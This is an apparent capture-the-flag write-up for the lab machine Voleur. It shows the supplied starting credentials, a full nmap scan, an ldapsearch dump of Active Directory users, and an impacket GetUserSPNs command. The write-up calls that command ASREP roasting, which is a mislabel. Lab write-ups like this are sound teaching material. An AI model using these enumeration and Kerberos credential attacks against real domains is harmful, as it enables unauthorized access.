---
hidden: true
---

# Voleur

## Machine Informations

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor / HollowOct31Nyt`&#x20;



## Port Scanning

```bash
└─$ nmap -T4 -sV -p- --open -oN port_scan.txt 10.10.11.76
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-09 21:26 CEST
Nmap scan report for 10.10.11.76
Host is up (0.031s latency).
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-10 03:28:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53424/tcp open  msrpc         Microsoft Windows RPC
63234/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
63235/tcp open  msrpc         Microsoft Windows RPC
63236/tcp open  msrpc         Microsoft Windows RPC
63260/tcp open  msrpc         Microsoft Windows RPC
64426/tcp open  msrpc         Microsoft Windows RPC

```



## LDAP Enumeration

With gave credentials we can access through the LDAP server.

From here we can get all AD users and save them into a file

{% code overflow="wrap" %}
```bash
ldapsearch -H ldap://voleur.htb -D "ryan.naylor@voleur.htb" -w 'HollowOct31Nyt' -b "dc=voleur,dc=htb" "(objectClass=user)" | grep "sAMAccountName: " | awk -F'sAMAccountName: ' '{print $2}' > users.txt
```
{% endcode %}

Now with the users file, try to perform ASREP roasting

{% code overflow="wrap" %}
```bash
impacket-GetUserSPNs -dc-ip 10.10.11.76 -dc-host dc.voleur.htb 'VOLEUR.HTB/ryan.naylor':'HollowOct31Nyt' -usersfile users.txt
```
{% endcode %}
